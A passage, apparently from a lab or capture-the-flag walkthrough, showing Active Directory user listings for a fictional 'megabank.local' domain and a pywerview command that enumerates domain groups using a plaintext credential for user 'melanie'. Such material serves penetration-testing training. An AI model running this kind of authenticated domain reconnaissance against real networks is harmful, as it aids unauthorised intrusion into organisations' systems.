instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Marko Novak
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            491182f2-0d74-4598-b'b889'-32e3ceec02a7
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-1111
primarygroupid:        513
profilepath:
pwdlastset:            2019-09-27 09:17:14.569061
samaccountname:        marko
samaccounttype:        805306368
scriptpath:
sn:                    Novak
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     marko@megabank.local
usnchanged:            69792
usncreated:            13110
whenchanged:           2019-12-03 13:24:27
whencreated:           2019-09-27 13:17:14

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Sunita Rahman
codepage:              0
countrycode:           0
distinguishedname:     CN=Sunita Rahman,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Sunita Rahman
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            b731523c-766d-42c0-b'a256'-2838033b0d58
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6601
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:26:29.108327
samaccountname:        sunita
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     sunita@megabank.local
usnchanged:            102647
usncreated:            102643
whenchanged:           2019-12-03 21:26:29
whencreated:           2019-12-03 21:26:29

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Abigail Jeffers
codepage:              0
countrycode:           0
distinguishedname:     CN=Abigail Jeffers,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Abigail Jeffers
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            569705bd-9cd2-4c3e-b'95c1'-a57adfe36993
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6602
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:27:30.936946
samaccountname:        abigail
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     abigail@megabank.local
usnchanged:            102669
usncreated:            102665
whenchanged:           2019-12-03 21:27:30
whencreated:           2019-12-03 21:27:30

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Marcus Strong
codepage:              0
countrycode:           0
distinguishedname:     CN=Marcus Strong,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Marcus Strong
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            87a7d98c-10f7-4df3-b'8d97'-9199ae13bb18
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6603
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:27:59.256272
samaccountname:        marcus
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     marcus@megabank.local
usnchanged:            102676
usncreated:            102672
whenchanged:           2019-12-03 21:27:59
whencreated:           2019-12-03 21:27:59

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Sally May
codepage:              0
countrycode:           0
distinguishedname:     CN=Sally May,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Sally May
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            5bad034c-9522-4b84-b'858d'-5365a54442e1
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6604
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:28:29.622615
samaccountname:        sally
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     sally@megabank.local
usnchanged:            102698
usncreated:            102694
whenchanged:           2019-12-03 21:28:29
whencreated:           2019-12-03 21:28:29

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Fred Carr
codepage:              0
countrycode:           0
distinguishedname:     CN=Fred Carr,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Fred Carr
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            be260794-86a5-4e8c-b'9644'-9aa65b43fef9
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6605
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:29:01.882442
samaccountname:        fred
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     fred@megabank.local
usnchanged:            102704
usncreated:            102700
whenchanged:           2019-12-03 21:29:01
whencreated:           2019-12-03 21:29:01

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Angela Perkins
codepage:              0
countrycode:           0
distinguishedname:     CN=Angela Perkins,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Angela Perkins
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            4925ca94-e42f-494c-b'a483'-f836ed7c370b
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6606
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:29:43.451148
samaccountname:        angela
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     angela@megabank.local
usnchanged:            102726
usncreated:            102722
whenchanged:           2019-12-03 21:29:43
whencreated:           2019-12-03 21:29:43

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Felicia Carter
codepage:              0
countrycode:           0
distinguishedname:     CN=Felicia Carter,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Felicia Carter
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            0abae800-e9b9-438d-b'a121'-0590033f364e
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6607
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:30:53.545222
samaccountname:        felicia
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     felicia@megabank.local
usnchanged:            102748
usncreated:            102744
whenchanged:           2019-12-03 21:30:53
whencreated:           2019-12-03 21:30:53

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Gustavo Pallieros
codepage:              0
countrycode:           0
distinguishedname:     CN=Gustavo Pallieros,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Gustavo Pallieros
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            51dcceb5-9dc8-400f-b'b084'-a4607753a543
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6608
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:31:42.082567
samaccountname:        gustavo
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     gustavo@megabank.local
usnchanged:            102770
usncreated:            102766
whenchanged:           2019-12-03 21:31:42
whencreated:           2019-12-03 21:31:42

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Ulf Berg
codepage:              0
countrycode:           0
distinguishedname:     CN=Ulf Berg,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Ulf Berg
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            32a91c97-6592-4ec3-b'b21b'-0fd00972bb97
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6609
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:32:19.957565
samaccountname:        ulf
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     ulf@megabank.local
usnchanged:            102788
usncreated:            102784
whenchanged:           2019-12-03 21:32:20
whencreated:           2019-12-03 21:32:19

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Stevie Gerrard
codepage:              0
countrycode:           0
distinguishedname:     CN=Stevie Gerrard,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Stevie Gerrard
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            3655d870-72ea-4ee5-b'b162'-1fdbe0e5c4b4
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6610
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:33:13.438134
samaccountname:        stevie
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     stevie@megabank.local
usnchanged:            102798
usncreated:            102794
whenchanged:           2019-12-03 21:33:13
whencreated:           2019-12-03 21:33:13

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Claire Norman
codepage:              0
countrycode:           0
distinguishedname:     CN=Claire Norman,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Claire Norman
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            d99818c1-64e3-4b5a-b'9637'-8bee742a46c8
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6611
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:33:44.808450
samaccountname:        claire
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     claire@megabank.local
usnchanged:            102821
usncreated:            102817
whenchanged:           2019-12-03 21:33:44
whencreated:           2019-12-03 21:33:44

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Paulo Alcobia
codepage:              0
countrycode:           0
distinguishedname:     CN=Paulo Alcobia,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Paulo Alcobia
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            9820ef48-6c54-4a85-b'b58c'-87ddadb63c3b
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6612
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:34:46.745427
samaccountname:        paulo
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     paulo@megabank.local
usnchanged:            102844
usncreated:            102840
whenchanged:           2019-12-03 21:34:46
whencreated:           2019-12-03 21:34:46

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Steve Rider
codepage:              0
countrycode:           0
distinguishedname:     CN=Steve Rider,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Steve Rider
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            1af1c91f-4439-421d-b'b644'-f02b1177ff97
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6613
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:35:25.125917
samaccountname:        steve
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     steve@megabank.local
usnchanged:            102850
usncreated:            102846
whenchanged:           2019-12-03 21:35:25
whencreated:           2019-12-03 21:35:25

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Annette Nilsson
codepage:              0
countrycode:           0
distinguishedname:     CN=Annette Nilsson,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Annette Nilsson
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            6c56c711-a5bb-4e12-b'b634'-e9ab5a2192f8
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6614
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:36:55.592358
samaccountname:        annette
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     annette@megabank.local
usnchanged:            102888
usncreated:            102884
whenchanged:           2019-12-03 21:36:55
whencreated:           2019-12-03 21:36:55

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Annika Larson
codepage:              0
countrycode:           0
distinguishedname:     CN=Annika Larson,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Annika Larson
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            b42e96d6-5051-4476-b'8918'-d9838ec0270d
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6615
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:37:23.666378
samaccountname:        annika
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     annika@megabank.local
usnchanged:            102894
usncreated:            102890
whenchanged:           2019-12-03 21:37:23
whencreated:           2019-12-03 21:37:23

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Per Olsson
codepage:              0
countrycode:           0
distinguishedname:     CN=Per Olsson,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Per Olsson
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            109fae54-cd7a-492f-b'a6ad'-d3838dadf5b2
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6616
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:38:12.278673
samaccountname:        per
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     per@megabank.local
usnchanged:            102916
usncreated:            102912
whenchanged:           2019-12-03 21:38:12
whencreated:           2019-12-03 21:38:04

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Claude Segal
codepage:              0
countrycode:           0
distinguishedname:     CN=Claude Segal,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Claude Segal
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            ec5c1c3d-c1ed-4cf6-b'9cef'-c4e8e3bb8c47
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-6617
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-03 16:39:56.407621
samaccountname:        claude
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     claude@megabank.local
usnchanged:            102954
usncreated:            102950
whenchanged:           2019-12-03 21:39:56
whencreated:           2019-12-03 21:39:56

accountexpires:        0
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Melanie Purkis
codepage:              0
countrycode:           0
distinguishedname:     CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
lastlogontimestamp:    132807315057391936
logoncount:            0
logonhours:            [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:              CN=Remote Management Users,CN=Builtin,DC=megabank,DC=local
name:                  Melanie Purkis
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            65328a5d-5b70-4e66-b'9006'-ea1846c36402
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-10101
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-04 09:31:02.476869
samaccountname:        melanie
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     melanie@megabank.local
usnchanged:            159801
usncreated:            131130
whenchanged:           2021-11-07 04:05:05
whencreated:           2019-12-04 10:38:45

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Zach Armstrong
codepage:              0
countrycode:           0
distinguishedname:     CN=Zach Armstrong,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Zach Armstrong
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            dc4beafd-12fa-4ddb-b'8aa2'-15e82444e60e
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-10102
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-04 05:39:27.835093
samaccountname:        zach
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     zach@megabank.local
usnchanged:            131144
usncreated:            131140
whenchanged:           2019-12-04 10:39:27
whencreated:           2019-12-04 10:39:27

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Simon Faraday
codepage:              0
countrycode:           0
distinguishedname:     CN=Simon Faraday,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Simon Faraday
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            87cf9aea-cb55-4a2e-b'bac4'-0793deb588eb
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-10103
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-04 05:39:58.563443
samaccountname:        simon
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     simon@megabank.local
usnchanged:            131150
usncreated:            131146
whenchanged:           2019-12-04 10:39:58
whencreated:           2019-12-04 10:39:58

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Naoki Yamamoto
codepage:              0
countrycode:           0
distinguishedname:     CN=Naoki Yamamoto,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 1601-01-01 00:00:00
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Naoki Yamamoto
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            ff6a0080-2cf5-481a-b'860a'-81c71903c0dd
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-10104
primarygroupid:        513
profilepath:
pwdlastset:            2019-12-04 05:40:44.342485
samaccountname:        naoki
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT']
userprincipalname:     naoki@megabank.local
usnchanged:            131156
usncreated:            131152
whenchanged:           2019-12-04 10:40:44
whencreated:           2019-12-04 10:40:44
```

### Domain Groups

```bash
$ pywerview get-netgroup -w megabank.local -u melanie -p 'Welcome123!' --dc-ip 10.129.251.7 --full-data
admincount:             1
cn:                     Administrators
description:            Administrators have complete and unrestricted access to the computer/domain
distinguishedname:      CN=Administrators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Domain Admins,CN=Users,DC=megabank,DC=local,
                        CN=Enterprise Admins,CN=Users,DC=megabank,DC=local,
                        CN=Administrator,CN=Users,DC=megabank,DC=local
name:                   Administrators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             139fccf2-d78c-4674-b'a3d4'-cf61340cfb1f
objectsid:              S-1-5-32-544
samaccountname:         Administrators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12775
usncreated:             8200
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:28:31

cn:                     Users
description:            Users are prevented from making accidental or intentional system-wide changes and can run most applications
distinguishedname:      CN=Users,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Domain Users,CN=Users,DC=megabank,DC=local,
                        CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=megabank,DC=local,
                        CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=megabank,DC=local
name:                   Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             8bc4a870-571b-4336-b'850f'-720cbd68be20
objectsid:              S-1-5-32-545
samaccountname:         Users
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12381
usncreated:             8203
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:28:31

cn:                     Guests
description:            Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
distinguishedname:      CN=Guests,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Domain Guests,CN=Users,DC=megabank,DC=local,
                        CN=Guest,CN=Users,DC=megabank,DC=local
name:                   Guests
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             3ec3b380-00dc-446d-b'8cdb'-7244af567c7f
objectsid:              S-1-5-32-546
samaccountname:         Guests
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12383
usncreated:             8209
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:28:31

admincount:             1
cn:                     Print Operators
description:            Members can administer printers installed on domain controllers
distinguishedname:      CN=Print Operators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Print Operators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             2e8ecf38-4497-464f-b'9555'-bd12193b93fd
objectsid:              S-1-5-32-550
samaccountname:         Print Operators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             78345
usncreated:             8212
whenchanged:            2019-12-03 14:18:30
whencreated:            2019-09-25 13:28:31

admincount:             1
cn:                     Backup Operators
description:            Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
distinguishedname:      CN=Backup Operators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Backup Operators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             54f1c290-2c43-426a-b'af99'-b45d7244de0c
objectsid:              S-1-5-32-551
samaccountname:         Backup Operators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12771
usncreated:             8213
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:28:31

admincount:             1
cn:                     Replicator
description:            Supports file replication in a domain
distinguishedname:      CN=Replicator,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Replicator
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             d03e7978-deb9-4b98-b'9859'-dec3f9665433
objectsid:              S-1-5-32-552
samaccountname:         Replicator
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12769
usncreated:             8214
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:28:31

cn:                     Remote Desktop Users
description:            Members in this group are granted the right to logon remotely
distinguishedname:      CN=Remote Desktop Users,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Remote Desktop Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             7889e131-ce4b-4de6-b'8c86'-2aab1955e42a
objectsid:              S-1-5-32-555
samaccountname:         Remote Desktop Users
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8215
usncreated:             8215
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Network Configuration Operators
description:            Members in this group can have some administrative privileges to manage configuration of networking features
distinguishedname:      CN=Network Configuration Operators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
